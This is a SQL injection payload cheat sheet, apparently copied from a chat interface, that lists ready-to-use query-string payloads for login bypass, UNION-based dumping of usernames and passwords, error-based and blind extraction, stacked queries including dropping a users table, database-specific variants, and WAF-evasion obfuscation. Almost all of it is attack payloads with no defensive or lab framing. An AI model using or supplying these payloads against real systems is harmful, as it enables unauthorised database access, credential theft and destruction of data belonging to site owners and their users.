üß™ Basic Payloads
1. Bypass Login or Filters

bash
Copy
Edit
?id=1 OR 1=1
?id=1' OR '1'='1
?id=1' --
?id=1' OR 1=1 -- -
2. Union-based Injection

pgsql
Copy
Edit
?id=1 UNION SELECT NULL, NULL
?id=1 UNION SELECT 1, 'username', 'password' FROM users
?id=-1 UNION SELECT null, version(), user() -- 
3. Error-based (to leak info)

pgsql
Copy
Edit
?id=1' AND 1=CONVERT(int, (SELECT @@version))-- 
?id=1' AND extractvalue(1, concat(0x7e, (SELECT user())))-- 
4. Time-based Blind SQLi

bash
Copy
Edit
?id=1' AND SLEEP(5) -- 
?id=1 AND IF(1=1, SLEEP(5), 0) -- 
üß™ Boolean-based Blind SQLi
Used to infer true/false responses:

bash
Copy
Edit
?id=1 AND 1=1 -- true
?id=1 AND 1=2 -- false
üß™ Stacked Queries (if supported)
Only works on some DBs and only if multiple queries are allowed:

sql
Copy
Edit
?id=1; DROP TABLE users --
?id=1; SELECT * FROM users --
üíâ DB-Specific Payloads
MySQL

pgsql
Copy
Edit
?id=1' AND (SELECT COUNT(*) FROM users) > 0 --
?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))=115 -- 
PostgreSQL

pgsql
Copy
Edit
?id=1; SELECT pg_sleep(5)--
?id=1' UNION SELECT NULL, version() -- 
MSSQL

bash
Copy
Edit
?id=1; WAITFOR DELAY '00:00:05' --
?id=1' OR 1=1;-- 
üîê Bypassing Basic WAFs
Some filters may block OR, UNION, etc. Try obfuscation:

perl
Copy
Edit
?id=1/**/OR/**/1=1
?id=1'/*!50000UNION*/SELECT-- 
?id=1%27%20OR%20%271%27=%271
